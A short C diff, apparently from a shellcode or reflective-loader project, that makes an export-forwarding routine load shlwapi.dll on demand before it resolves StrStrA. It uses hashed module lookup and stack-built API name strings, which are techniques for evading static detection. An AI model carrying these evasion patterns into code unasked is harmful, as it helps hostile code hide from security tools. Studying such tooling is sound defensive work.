@@ -22,14 +22,17 @@ int MyStrCmp(const char* p1, const char* p2) {
 }
 
 UINT64 FollowExport(char* ptr_forward, LPCSTR lpProcName) {
-    UINT64 shlwapiDLL = GetLoadedLibrary(CRYPTED_HASH_SHLWAPIDLL);
     UINT64 kernel32DLL = GetLoadedLibrary(CRYPTED_HASH_KERNEL32);
-    CHAR strStrAString[] = { 'S', 't', 'r', 'S', 't', 'r', 'A', 0 };
-    STRSTRA _StrStrA = (STRSTRA)GetSymbolAddress(shlwapiDLL, strStrAString);
     CHAR loadLibraryAString[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0 };
     LOADLIBRARYA loadLibraryAFunc = (LOADLIBRARYA)GetSymbolAddress(kernel32DLL, loadLibraryAString);
-
-
+    UINT64 shlwapiDLL = GetLoadedLibrary(CRYPTED_HASH_SHLWAPIDLL);
+    if (shlwapiDLL == 0) {
+        CHAR shlwapiDLLString[] = { 's','h','l','w','a','p','i','.','d','l','l',0x00 };
+        loadLibraryAFunc(shlwapiDLLString);
+        shlwapiDLL = GetLoadedLibrary(CRYPTED_HASH_SHLWAPIDLL);
+    }
+    CHAR strStrAString[] = { 'S', 't', 'r', 'S', 't', 'r', 'A', 0 };
+    STRSTRA _StrStrA = (STRSTRA)GetSymbolAddress(shlwapiDLL, strStrAString);
 
     char del[] = { '.', 0x00 };
     char* pos_del = 0x00;
